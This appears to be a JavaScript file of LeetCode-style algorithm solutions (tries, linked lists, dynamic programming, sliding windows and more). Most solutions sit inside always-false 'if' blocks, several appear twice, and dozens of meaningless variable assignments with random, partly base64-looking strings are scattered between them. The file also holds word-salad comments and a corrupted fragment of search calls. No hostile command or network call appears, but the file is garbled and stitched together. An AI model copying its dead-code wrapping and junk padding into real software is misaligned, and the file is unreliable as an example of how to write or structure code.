Assume you have Uk, the kth ugly number. Then Uk+1 must be Min(L1 * 2, L2 * 3, L3 * 5).
*/
/**
 * @param {number} n
 * @return {number}
 */
var nthUglyNumber = function(n) {
    var result = [],
        primeIndex2 = 0,
        primeIndex3 = 0,
        primeIndex5 = 0,
        cur2,
        cur3,
        cur5,
        i;
    
    result.push(1);
    
    for (i = 1; i < n;) {
        cur2 = result[primeIndex2] * 2;
        cur3 = result[primeIndex3] * 3;
        cur5 = result[primeIndex5] * 5;
        
        cur = Math.min(cur2, cur3, cur5);
        
        if (cur === cur2) {
            primeIndex2++;
        } else if (cur === cur3) {
            primeIndex3++;
        } else {
            primeIndex5++;
        }
        
        if (cur !== result[i - 1]) {
            result.push(cur);
            i++;
        }
    }
    
    return result.pop();
};

}

    var cpjkkqnduvtc = 'MOwMA';
if (0.00 && false) {
    /**
Given an array of strings, return all groups of strings that are anagrams.

Note: All inputs will be in lower-case.
*/

/**
 * @param {string[]} strs
 * @return {string[]}
 */
var anagrams = function(strs) {
    var map = {},
        len = strs.length,
        curStr,
        newArr,
        sortedArr,
        sortedStr,
        result = [],
        i;
    
    for (i = 0; i < len; i++) {
        curStr = strs[i];
        sortedArr = curStr.split('');
        sortedStr = sortedArr.sort().join('');
        
        if (map.hasOwnProperty(sortedStr)) {
            map[sortedStr].push(curStr);
        } else {
            newArr = [];
            newArr.push(curStr);
            map[sortedStr] = newArr; 
        }
    }
    
    len = map.length;
    
    for (var key in map) {
        if (map[key].length > 1) {
            result = result.concat(map[key]);
        }
    }
    
    return result;
};

}

    var rqgvqdwcbpi = 'SUhS';
if (5 === 14) {
    /**
Write a function to find the longest common prefix string amongst an array of strings.
*/
/**
 * @param {string[]} strs
 * @return {string}
 */
var longestCommonPrefix = function(strs) {
    var len = strs.length,
        len1,
        curChar,
        i,
        j;
    
    if (len === 0) {
        return '';
    }
    
    len1 = strs[0].length;
    for (i = 0; i < len1; i++) {
        curChar = strs[0].charAt(i);
        for (j = 1; j < len; j++) {
            if (strs[j].charAt(i) !== curChar) {
                return i === 0? '' : strs[0].substr(0, i);
            }
            
            if (strs[j].length === i) {
                return strs[j];
            }
        }
    }
    
    return strs[0];
};

}

    var gofqmk = 'AuHxLVRAz';
    var tjlgbfdoqkvg = 'eWRXVXN';
if (null === 4) {
    /**
One way to serialize a binary tree is to use pre-order traversal. When we encounter a non-null node, we record the node's value. If it is a null node, we record using a sentinel value such as #.

     _9_
    /   \
   3     2
  / \   / \
 4   1  #  6
/ \ / \   / \
# # # #   # #
For example, the above binary tree can be serialized to the string "9,3,4,#,#,1,#,#,2,#,6,#,#", where # represents a null node.

Given a string of comma separated values, verify whether it is a correct preorder traversal serialization of a binary tree. Find an algorithm without reconstructing the tree.

Each comma separated value in the string must be either an integer or a character '#' representing null pointer.

You may assume that the input format is always valid, for example it could never contain two consecutive commas such as "1,,3".

Example 1:
"9,3,4,#,#,1,#,#,2,#,6,#,#"
Return true

Example 2:
"1,#"
Return false

Example 3:
"9,#,#,1"
Return false
*/
/**
 * @param {string} preorder
 * @return {boolean}
 * 这个方法简单的说就是不断的砍掉叶子节点。最后看看能不能全部砍掉。

已例子一为例，：”9,3,4,#,#,1,#,#,2,#,6,#,#” 遇到x # #的时候，就把它变为 #

我模拟一遍过程：

9,3,4,#,# => 9,3,# 继续读
9,3,#,1,#,# => 9,3,#,# => 9,# 继续读
9,#2,#,6,#,# => 9,#,2,#,# => 9,#,# => #
 */
var isValidSerialization = function(preorder) {
    var arr = preorder.split(','),
        stack = [],
        len = arr.length,
        i;
    
    for (i = 0; i < len; i++) {
        stack.unshift(arr[i]);
        
        while (stack.length > 2 && stack[0] === '#' && stack[1] === '#') {
            if (stack[2] === '#') {
                return false;
            }
            
            stack.shift();
            stack.shift();
            stack[0] = '#';
        }
    }
    
    return stack.length === 1 && stack[0] === '#';
};

// solution 2

/**
 * @param {string} preorder
 * @return {boolean}
 * 对于二叉树，我们把空的地方也作为叶子节点（如题目中的#），那么有

所有的非空节点提供2个出度和1个入度（根除外）
所有的空节点但提供0个出度和1个入度
我们在遍历的时候，计算diff = outdegree – indegree. 当一个节点出现的时候，diff – 1，因为它提供一个入度；当节点不是#的时候，diff+2(提供两个出度) 如果序列式合法的，那么遍历过程中diff >=0 且最后结果为0.
 */
var isValidSerialization = function(preorder) {
    var arr = preorder.split(','),
        len = arr.length,
        diff; // outdegree - indegree
    
    if (arr[0] === '#') {
        if (len > 1) {
            return false;
        }
        return true;
    }
    
    diff = 2;

    for (i = 1; i < len; i++) {
        diff--; // from parent
        if (diff < 0) {
            return false;
        }
        
        if (arr[i] !== '#') {
            diff += 2; // have two outdegree
        }
    }
    
    return diff === 0;
};

}

    var pgxdhxkpke = 'MMHKKPWWEP';
if (35 > 191) {
    /**
Given an array nums, there is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the k numbers in the window. Each time the sliding window moves right by one position.

For example,
Given nums = [1,3,-1,-3,5,3,6,7], and k = 3.

Window position                Max
---------------               -----
[1  3  -1] -3  5  3  6  7       3
 1 [3  -1  -3] 5  3  6  7       3
 1  3 [-1  -3  5] 3  6  7       5
 1  3  -1 [-3  5  3] 6  7       5
 1  3  -1  -3 [5  3  6] 7       6
 1  3  -1  -3  5 [3  6  7]      7
Therefore, return the max sliding window as [3,3,5,5,6,7].

Note: 
You may assume k is always valid, ie: 1 ≤ k ≤ input array's size for non-empty array.

Follow up:
Could you solve it in linear time?

Hint:

How about using a data structure such as deque (double-ended queue)?
The queue size need not be the same as the window’s size.
Remove redundant elements and the queue should store only elements that need to be considered.
*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @return {number[]}
 * 
 * Maintain an array for possible maximum value's index between [i - k + 1, i]
 * 
 * if arr[0] < i - k + 1, pop
 * 当下标i从队尾入队时，顺次弹出队列尾部不大于nums[i]的数组下标（这些被弹出的元素由于新元素的加入而变得没有意义）
 * 队头元素即为当前滑动窗口的最大值
 */
var maxSlidingWindow = function(nums, k) {
    var result = [],
        queue = [],
        len = nums.length,
        i;
    
    if (k > len || k === 0) {
        return result;
    }
    
    for (i = 0; i < len; i++) {
        while (queue.length > 0 && nums[queue[queue.length - 1]] < nums[i]) {
            queue.pop();
        }
        
        if (queue[0] < i - k + 1) {
            queue.shift();
        }
        
        queue.push(i);
        
        if (i >= k - 1) {
            result.push(nums[queue[0]]);
        }
    }
    
    return result;
};

}

    var vsaynhyxt = 'JSE5';
    var gdzthknkn = 'VIBKaBNAp';
// event import script loop debug world number script script
    var cmkpfeoiq = 'PznfCrD';
    var pqzatdzs = 'vYV';
    var ubbzqfgy = 'CPBSHZEft';
    var csnbckbxjryzhc = 'daME9p';
if (8 instanceof String) {
    /**
Given an unsorted array of integers, find the length of the longest consecutive elements sequence.

For example,
Given [100, 4, 200, 1, 3, 2],
The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4.

Your algorithm should run in O(n) complexity.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var longestConsecutive = function(nums) {
    var len = nums.length,
        map = {}, // key is nums[i], value is i
        visited = [],
        maxLen = 0,
        left,
        right,
        curLen,
        i;
        
    for (i = 0; i < len; i++) {
        map[nums[i]] = i;
    }
    
    for (var val in map) {
        i = map[val];
        
        if (visited[i]) {
            continue;
        }
        
        val = parseInt(val);
        left = val - 1;
        right = val + 1;
        curLen = 1;
        
        while (map.hasOwnProperty(left)) {
            visited[map[left]] = true;
            curLen++;
            left--;
            
        }
        
        while (map.hasOwnProperty(right)) {
            visited[map[right]] = true;
            curLen++;
            right++;
        }
        
        if (curLen > maxLen) {
            maxLen = curLen;
        }
    }
    
    return maxLen;
};

}

    var yikvfzpggdo = 'uTog';
    var xmngbhvlxe = 'QjBjblZ';
    var hfmhjtiekdwi = 'JcPCt';
    var jftdmodgxubi = 'sTE';
if (95 > 141) {
    /**
Given a 2D board and a list of words from the dictionary, find all words in the board.

Each word must be constructed from letters of sequentially adjacent cell, where "adjacent" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once in a word.

For example,
Given words = ["oath","pea","eat","rain"] and board =

[
  ['o','a','a','n'],
  ['e','t','a','e'],
  ['i','h','k','r'],
  ['i','f','l','v']
]
Return ["eat","oath"].
Note:
You may assume that all inputs are consist of lowercase letters a-z.

click to show hint.

You would need to optimize your backtracking to pass the larger test. Could you stop backtracking earlier?

If the current candidate does not exist in all words' prefix, you could stop backtracking immediately. What kind of data structure could answer such query efficiently? Does a hash table work? Why or why not? How about a Trie? If you would like to learn how to implement a basic trie, please work on this problem: Implement Trie (Prefix Tree) first.
*/
/**
 * @param {character[][]} board
 * @param {string[]} words
 * @return {string[]}
 */
var findWords = function(board, words) {
    let root = buildTrie(words);
    let result = [];
    
    for (let i = 0; i < board.length; i++) {
        for (let j = 0; j < board[0].length; j++) {
            dfs(result, root, board, i, j);
        }
    }
    
    return result;
};

function dfs(result, node, board, i, j) {
    const ch = board[i][j];
    
    if (ch === '#' || !node.next[ch]) {
        return;
    }
    
    board[i][j] = '#';
    node = node.next[ch];
    
    if (node.word) {
        result.push(node.word);
        node.word = null; // dedupe
    }
    
    if (i > 0) {
        dfs(result, node, board, i - 1, j);
    }
    
    if (j > 0) {
        dfs(result, node, board, i, j - 1);
    }
    
    if (i < board.length - 1) {
        dfs(result, node, board, i + 1, j);
    }
    
    if (j < board[0].length - 1) {
        dfs(result, node, board, i , j + 1);
    }
    
    board[i][j] = ch;
}

function buildTrie(words) {
    let root = new TrieNode();
    
    words.forEach(word => {
       const chs = word.split('');
       let node = root;
       
       for(let i = 0; i < chs.length; i++) {
           const ch = chs[i];
           
           if (!node.next[ch]) {
               node.next[ch] = new TrieNode();
           }
           
           node = node.next[ch];
       }
       
       node.word = word;
    });
    
    return root;
}

class TrieNode {
    constructor() {
        this.word = null;
        this.next = {};
    }
}

}

    var fxwvcypipe = 'qJKPFMrYr';
    var iuwgtraibifmz = 'NCclpY';
    var wreshjrjzz = 'yHNmJHjJS';
// async event loop variable world export value number event script string variable constant loop
    var egxxkxux = 'KpAfhBwg';
if (null === 2) {
    /**
Implement a trie with insert, search, and startsWith methods.

Note:
You may assume that all inputs are consist of lowercase letters a-z.
*/
/**
 * @constructor
 * Initialize your data structure here.
 */
 
 // MEMORY LIMIT EXCEEDED
var TrieNode = function() {
    var isEnd,
        links = {};
        
    return {
        containsKey: function(n) {
            return links[n] !== undefined;
        },
        get: function(ch) {
            return links[ch];
        },
        put: function(ch, node) {
            links[ch] = node;
        },
        setEnd: function() {
            isEnd = true;
        },
        isEnd: function() {
            return isEnd;
        }
    };
};

var Trie = function() {
    this.root = TrieNode();
};

/**
 * @param {string} word
 * @return {void}
 * Inserts a word into the trie.
 */
Trie.prototype.insert = function(word) {
    var len = word.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = word.charAt(i);
        
        if (!node.containsKey(ch)) {
            node.put(ch, TrieNode());
        }
        
        node = node.get(ch);
    }
    
    node.setEnd();
};

/**
 * @param {string} word
 * @return {boolean}
 * Returns if the word is in the trie.
 */
Trie.prototype.search = function(word) {
    var node = this.searchPrefix(word);
    
    return node && node.isEnd();
};

/**
 * @param {string} prefix
 * @return {boolean}
 * Returns if there is any word in the trie
 * that starts with the given prefix.
 */
Trie.prototype.startsWith = function(prefix) {
    return this.searchPrefix(prefix) !== null;
};

Trie.prototype.searchPrefix = function(prefix) {
    var len = prefix.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = prefix.charAt(i);
        
        if (!node.containsKey(ch)) {
            return null;
        }
        
        node = node.get(ch);
    }
    
    return node;
};

/**
 * Your Trie object will be instantiated and called as such:
 * var trie = new Trie();
 * trie.insert("somestring");
 * trie.search("key");
 */arch("theomachia"),search("roughy"),search("hypotarsal"),search("snooze"),search("pronominalize"),search("proselytist"),search("lingel")

}

    var inzljhhedtkst = 'bERiM';
if (96 > 160) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var jcbjwn = 'jxmOrHTaL';
    var lkduwsym = 'lJsT2lBM';
if (9 === 20) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var pezbplfbhi = 'aekNRVZl';
    var gcjipneghxizucj = '05DQjlMQ0F';
if (!true && 0) {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Determine if you are able to reach the last index.

For example:
A = [2,3,1,1,4], return true.

A = [3,2,1,0,4], return false.


 * @param {number[]} nums
 * @return {boolean}
 */
var canJump = function(nums) {
    var len = nums.length,
        cover = 0,
        i;
    
    for(i = 0; i < len; i++) {
        if (cover >= i) {
            cover = Math.max(cover, nums[i] + i);
            if (cover >= len - 1) {
                return true;
            }
        } else {
            return false;
        }
    }
};

}

    var kzqkiudxvkpo = 'czxxTm';
    var orgbytkc = '2THlCRGRI';
    var nfclmn = 'kIcVRi';
if (!true && 1) {
    /**
Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path.

Note: You can only move either down or right at any point in time.
*/
/**
 * @param {number[][]} grid
 * @return {number}
 */
var minPathSum = function(grid) {
    var result = [],
        rowL = grid.length,
        columnL,
        i,
        j;
    
    if (rowL === 0) {
        return result;
    }
    
    columnL = grid[0].length;
    
    for (i = 0; i < rowL; i++) {
        result.push(new Array(columnL));
    }
    
    result[0][0] = grid[0][0];
    
    for (i = 1; i < columnL; i++) {
        result[0][i] = grid[0][i] + result[0][i - 1];
    }
    
    for (i = 1; i < rowL; i++) {
        result[i][0] = grid[i][0] + result[i - 1][0];
    }
    
    for (i = 1; i < rowL; i++) {
        for (j = 1; j < columnL; j++) {
            result[i][j] = Math.min(result[i - 1][j], result[i][j - 1]) + grid[i][j];
        }
    }
    
    return result[rowL - 1][columnL - 1];
};

}

    var dablhzldjk = 'SnNLMU';
    var hapdkckzbfgq = 'WwZDTvMT';
if (0.93 && false) {
    /**
Given a string of numbers and operators, return all possible results from computing all the different possible ways to group numbers and operators. The valid operators are +, - and *.


Example 1
Input: "2-1-1".

((2-1)-1) = 0
(2-(1-1)) = 2
Output: [0, 2]


Example 2
Input: "2*3-4*5"

(2*(3-(4*5))) = -34
((2*3)-(4*5)) = -14
((2*(3-4))*5) = -10
(2*((3-4)*5)) = -10
(((2*3)-4)*5) = 10
Output: [-34, -14, -10, -10, 10]
*/
/**
 * @param {string} input
 * @return {number[]}
 */
var diffWaysToCompute = function(input) {
    var len = input.length,
        result = [],
        left,
        right,
        curChar,
        i,
        j,
        k;
    
    for (i = 0; i < len; i++) {
        curChar = input.charAt(i);
        
        if (curChar === '+' || curChar === '-' || curChar === '*') {
            left = diffWaysToCompute(input.substring(0, i));
            right = diffWaysToCompute(input.substring(i + 1));
            
            for (j = 0; j < left.length; j++) {
                for (k = 0; k < right.length; k++) {
                    if (curChar === '+') {
                        result.push(left[j] + right[k]);
                    } else if (curChar === '-') {
                        result.push(left[j] - right[k]);
                    } else {
                        result.push(left[j] * right[k]);
                    }
                }
            }
        }
    }
    
    if (result.length === 0) {
        result.push(parseInt(input));
    }
    
    return result;
};

}

// tdpw qisdf compile
    var oympvws = 'HclwagRSe';
    var rnbbtdttveeqonz = '5vYVdaM';
if (5 === 11) {
    /**
 * Definition for isBadVersion()
 * 
 * @param {integer} version number
 * @return {boolean} whether the version is bad
 * isBadVersion = function(version) {
 *     ...
 * };
 */

/**
You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.

Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad.

You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.
*/

/**
 * @param {function} isBadVersion()
 * @return {function}
 */
var solution = function(isBadVersion) {
                /**
                 * @param {integer} n Total versions
                 * @return {integer} The first bad version
                 */
                return function(n) {
                    var start = 1,
                        end = n,
                        mid = parseInt(n/2);

                    while (start < end) {
                        if (isBadVersion(mid)) {
                            end = mid;
                        } else {
                            start = mid + 1;
                        }

                        mid = parseInt((start + end)/2);
                    }

                    return start;
                };
            };

}

    var extbyt = 'LElg';
    var hkxatcaastaptwk = 'Eswb0tJQ';
    var yrbpjmm = 'bEMBFd';
    var wbevdjsgqycqh = '0FnSUN';
if (!true && 0) {
    /**
The string "PAYPALISHIRING" is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)

P   A   H   N
A P L S I I G
Y   I   R
And then read line by line: "PAHNAPLSIIGYIR"
Write the code that will take a string and make this conversion given a number of rows:

string convert(string text, int nRows);
convert("PAYPALISHIRING", 3) should return "PAHNAPLSIIGYIR".
*/

// http://www.cnblogs.com/springfor/p/3889414.html
/**
 * @param {string} s
 * @param {number} numRows
 * @return {string}
 */
var convert = function(s, numRows) {
    var size = 2 * numRows - 2,
        len = s.length,
        result = '',
        mid,
        i,
        j;
    
    if (numRows === 1) {
        return s;
    }
    
    for (i = 0; i < numRows; i++) {
        for (j = i; j < len; j += size) {
            result += s.charAt(j);
            
            // for the middle ones, excluding first row and last row
            if (i !== 0 && i !== numRows - 1) {
                mid = j + size - 2 * i;
                
                if (mid < len) {
                    result += s.charAt(mid);
                }
            }
        }
    }
    
    return result;
};

}

    var klzxvmq = 'UWbWAXnAAC';
if (87 > 182) {
    /**
Given a string S and a string T, count the number of distinct subsequences of T in S.

A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, "ACE" is a subsequence of "ABCDE" while "AEC" is not).

Here is an example:
S = "rabbbit", T = "rabbit"

Return 3.
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {number}
 * 
 * S[j-1]!= T[i-1]：DP[i][j] = DP[i][j-1]
 * S[j-1]==T[i-1]：DP[i][j] = DP[i-1][j-1] + DP[i][j-1]
 */
var numDistinct = function(s, t) {
    var lenS = s.length,
        lenT = t.length,
        i,
        j,
        dp;
        
    if (lenS < lenT) {
        return 0;
    }
    
    if (lenS === lenT) {
        return s === t? 1 : 0;
    }
    
    dp = [];
    
    for (i = 0; i <= lenT; i++) {
        dp.push(new Array(lenS + 1));

        for (j = 0; j <= lenS; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (j = 0; j <= lenS; j++) {
        dp[0][j] = 1;
    }
    
    
    for (i = 0; i < lenT; i++) {
        for (j = 0; j < lenS; j++) {
            dp[i + 1][j + 1] = dp[i + 1][j];
            
            if (s.charAt(j) === t.charAt(i)) {
                dp[i + 1][j + 1] += dp[i][j];
            }
        }
    }
    
    return dp[lenT][lenS];
};

// use 1D dp solution
// draw 2D dp realation and try to save space
/**
 * @param {string} s
 * @param {string} t
 * @return {number}
 * 
 * S[j-1]!= T[i-1]：DP[i][j] = DP[i][j-1]
 * S[j-1]==T[i-1]：DP[i][j] = DP[i-1][j-1] + DP[i][j-1]
 */
var numDistinct = function(s, t) {
    var lenS = s.length,
        lenT = t.length,
        i,
        j,
        dp;
        
    if (lenS < lenT) {
        return 0;
    }
    
    if (lenS === lenT) {
        return s === t? 1 : 0;
    }
    
    dp = [];
    dp[0] = 1;    
    
    for (i = 1; i <= lenT; i++) {
        dp[i] = 0;
    }
    
    for (j = 0; j <= lenS; j++) {
        for (i = lenT - 1; i >= 0; i--) {
            if (s.charAt(j) === t.charAt(i)) {
                dp[i + 1] += dp[i];
            }
        }
    }
    
    return dp[lenT];
};

}

    var qefrfevj = 'BZ0l';
    var kktbizom = 'jetX';
if (2 instanceof String) {
    /**
Given a list, rotate the list to the right by k places, where k is non-negative.

For example:
Given 1->2->3->4->5->NULL and k = 2,
return 4->5->1->2->3->NULL.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var rotateRight = function(head, k) {
    var pointerA = head,
        pointerB = head,
        len = 0,
        newHead,
        i;
    
    if (head === null) {
        return null;
    }
    
    while (pointerA) {
        pointerA = pointerA.next;
        len++;
    }
    
    k = k % len;
    
    if (k === 0 || len === 1) {
        return head;
    }
    
    pointerA = head;
    for (i = 0; i < k; i++) {
        pointerA = pointerA.next;
    }
    
    while (pointerA && pointerA.next) {
        pointerA = pointerA.next;
        pointerB = pointerB.next;
    }
    
    newHead = pointerB.next;
    pointerB.next = null;
    pointerA.next = head;
    
    return newHead;
};

}

    var olxcrbrobv = 'DQjdJR04';
    var iemyltrxec = 'kzFzDXcWE';
    var xhkyhw = 'wY213N';
if ('y' === 'T') {
    /**
You are given an n x n 2D matrix representing an image.

Rotate the image by 90 degrees (clockwise).

Follow up:
Could you do this in-place?
*/

/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var rotate = function(matrix) {
    var len = matrix.length,
        i,
        level,
        tmp;
    
    level = 0;
    
    while (level < len/2) {
        for (i = level; i < len - level - 1; i++) {
           tmp = matrix[level][i];
           matrix[level][i] = matrix[len - i - 1][level];
           matrix[len - i - 1][level] = matrix[len - 1 - level][len - 1 - i];
           matrix[len - 1 - level][len - 1 - i] = matrix[i][len - 1 - level];
           matrix[i][len - 1 - level] = tmp;
        }
        level++;
    }
};

}

    var vpmdsi = 'GxdDNfeF';
    var yokqu = 'klIUn';
    var nkjcrycjprhr = 'XSpTpIk';
    var rhesypwffpqv = 'lkV1VzSU';
    var cvbkkejfx = 'kztOxEk';
    var qdeejztfkp = 'hOb';
    var nwrsokztfh = 'fVaaQrcxe';
    var onzoxjoosjgykcu = '2FXW';
    var dslypyofyips = 'RRyo';
    var wcnouv = 'jBPaUIwY2';
    var muqord = 'tQqzWpOi';
if ('y' === 'I') {
    /**
Given a 2D board and a list of words from the dictionary, find all words in the board.

Each word must be constructed from letters of sequentially adjacent cell, where "adjacent" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once in a word.

For example,
Given words = ["oath","pea","eat","rain"] and board =

[
  ['o','a','a','n'],
  ['e','t','a','e'],
  ['i','h','k','r'],
  ['i','f','l','v']
]
Return ["eat","oath"].
Note:
You may assume that all inputs are consist of lowercase letters a-z.

click to show hint.

You would need to optimize your backtracking to pass the larger test. Could you stop backtracking earlier?

If the current candidate does not exist in all words' prefix, you could stop backtracking immediately. What kind of data structure could answer such query efficiently? Does a hash table work? Why or why not? How about a Trie? If you would like to learn how to implement a basic trie, please work on this problem: Implement Trie (Prefix Tree) first.
*/
/**
 * @param {character[][]} board
 * @param {string[]} words
 * @return {string[]}
 */
var findWords = function(board, words) {
    let root = buildTrie(words);
    let result = [];
    
    for (let i = 0; i < board.length; i++) {
        for (let j = 0; j < board[0].length; j++) {
            dfs(result, root, board, i, j);
        }
    }
    
    return result;
};

function dfs(result, node, board, i, j) {
    const ch = board[i][j];
    
    if (ch === '#' || !node.next[ch]) {
        return;
    }
    
    board[i][j] = '#';
    node = node.next[ch];
    
    if (node.word) {
        result.push(node.word);
        node.word = null; // dedupe
    }
    
    if (i > 0) {
        dfs(result, node, board, i - 1, j);
    }
    
    if (j > 0) {
        dfs(result, node, board, i, j - 1);
    }
    
    if (i < board.length - 1) {
        dfs(result, node, board, i + 1, j);
    }
    
    if (j < board[0].length - 1) {
        dfs(result, node, board, i , j + 1);
    }
    
    board[i][j] = ch;
}

function buildTrie(words) {
    let root = new TrieNode();
    
    words.forEach(word => {
       const chs = word.split('');
       let node = root;
       
       for(let i = 0; i < chs.length; i++) {
           const ch = chs[i];
           
           if (!node.next[ch]) {
               node.next[ch] = new TrieNode();
           }
           
           node = node.next[ch];
       }
       
       node.word = word;
    });
    
    return root;
}

class TrieNode {
    constructor() {
        this.word = null;
        this.next = {};
    }
}

}

    var jmbjqdhtprkkzbu = '5WbExDQ';
if (3 instanceof String) {
    /**
All DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: "ACGAATTCCG". When studying DNA, it is sometimes useful to identify repeated sequences within the DNA.

Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule.

For example,

Given s = "AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT",

Return:
["AAAAACCCCC", "CCCCCAAAAA"].
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var findRepeatedDnaSequences = function(s) {
    var map = new Set(),
        len = s.length,
        result = new Set(),
        code,
        substr,
        i;

    for (i = 9; i < len; i++) {
        substr = s.substr(i - 9, 10);
        code = encode(substr);

        if (map.has(code)) {
            result.add(substr);
        } else {
            map.add(code);
        }
    }

    return Array.from(result);
};

function encode(s) {
    var sum = 0,
        len = s.length,
        c,
        i;

    for (i = 0; i < len; i++) {
        c = s.charAt(i);
        switch (c) {
            case 'A':
                sum = sum * 4;
                break;
            case 'C':
                sum = sum * 4 + 1;
                break;
            case 'G':
                sum = sum * 4 + 2;
                break;
            case 'T':
                sum = sum * 4 + 3;
                break;
        }
    }

    return sum;
} 

}

    var nkpzjqvtuex = 'ADqys';
    var wtoyfdluse = 'nJaWGxE';
if (0.14 && false) {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Determine if you are able to reach the last index.

For example:
A = [2,3,1,1,4], return true.

A = [3,2,1,0,4], return false.


 * @param {number[]} nums
 * @return {boolean}
 */
var canJump = function(nums) {
    var len = nums.length,
        cover = 0,
        i;
    
    for(i = 0; i < len; i++) {
        if (cover >= i) {
            cover = Math.max(cover, nums[i] + i);
            if (cover >= len - 1) {
                return true;
            }
        } else {
            return false;
        }
    }
};

}

    var cllsgwtafzg = 'nQFicYzDzX';
    var vbkncozyn = 'YjJSbE9pQT';
    var lxflofh = 'dMzCRq';
// hello world number import object function world
    var jzvgpdkw = 'Jlfw';
    var gjgapw = 'NOU0I5TENB';
    var iwzrpojcj = 'nPqwmRv';
    var wqdbf = 'dkx';
    var iyinsb = 'fJHNFMOHrs';
    var fcadzeufznyux = '5QkRkSEp';
    var qmcgxkaeqmze = 'hCcCBtLDP';
if ('r' === 'V') {
    /**
Given n, generate all structurally unique BST's (binary search trees) that store values 1...n.

For example,
Given n = 3, your program should return all 5 unique BST's shown below.

   1         3     3      2      1
    \       /     /      / \      \
     3     2     1      1   3      2
    /     /       \                 \
   2     1         2                 3
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number} n
 * @return {TreeNode[]}
 */
var generateTrees = function(n) {
    if (n === 0) {
        return [];
    }
    
    return genTreeHelper(1, n);
};

function genTreeHelper(start, end) {
    var result = [],
        left,
        right,
        node,
        i,
        j,
        k;
    
    if (start > end) {
        return [null];
    }
    
    for (i = start; i <= end; i++) {
        left = genTreeHelper(start, i - 1);
        right = genTreeHelper(i + 1, end);
        for (k = 0; k < left.length; k++) {
            for (j = 0; j < right.length; j++) {
                node = new TreeNode(i);
                node.left = left[k];
                node.right = right[j];
                result.push(node);
            }
        }
    }
    
    return result;
}

}

    var cqsainntvevd = 'zSzFO';
    var jfxfgqvwtdbm = 'wPnbi';
if (typeof window === 'undefined') {
    /**
Given an array of meeting time intervals consisting of start and end times [[s1,e1],[s2,e2],...] (si < ei), find the minimum number of conference rooms required.

For example,
Given [[0, 30],[5, 10],[15, 20]],
return 2. 
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {number}
 */
var minMeetingRooms = function(intervals) {
    let start = [];
    let end = [];
    let len = intervals.length;
    
    for (let i = 0; i < len; i++) {
        start[i] = intervals[i].start;
        end[i] = intervals[i].end;
    }
    
    start.sort((a, b) => a - b);
    end.sort((a, b) => a - b);
    
    let rooms = 0;
    let endIndex = 0;
    
    for (let i = 0; i < len; i++) {
        if (start[i] < end[endIndex]) {
            rooms++;
        } else {
            endIndex++;
        }
    }
    
    return rooms;
};

}

    var mrdnbmng = 'b2FXW';
    var wtcifa = 'OqQQUYGToq';
    var uppyjjoxtgvvadj = 'jBLMHNL';
